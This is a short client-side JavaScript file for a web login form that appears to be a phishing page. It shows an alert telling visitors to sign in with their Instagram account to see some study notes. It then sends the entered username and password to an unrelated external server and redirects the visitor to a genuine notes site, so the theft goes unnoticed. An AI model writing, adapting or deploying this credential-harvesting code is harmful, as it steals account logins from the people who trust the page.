const sign_in_btn = document.querySelector("#sign-in-btn");
const sign_up_btn = document.querySelector("#sign-up-btn");
const container = document.querySelector(".container");
const name = document.getElementById("name");
const pass = document.getElementById("password");
alert("To access the Notes,Please Login using Instagram account")

// sign_up_btn.addEventListener('click', () =>{
//     container.classList.add("sign-up-mode");
// });

// sign_in_btn.addEventListener('click', () =>{
//     container.classList.remove("sign-up-mode");
// });

 // API call
 const thisForm = document.getElementById('myform');
thisForm.addEventListener('submit', async function (e) {
    e.preventDefault();
    const formData = {
        name: name.value,
        password: pass.value
    };
    const response = await fetch('https://login-page-tau-six.vercel.app/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    });

    const result = await response.json();
    console.log(result)
    window.location.href = 'https://www.ilmkidunya.com/11th-class/notes/biology-federal-board#google_vignette'
});
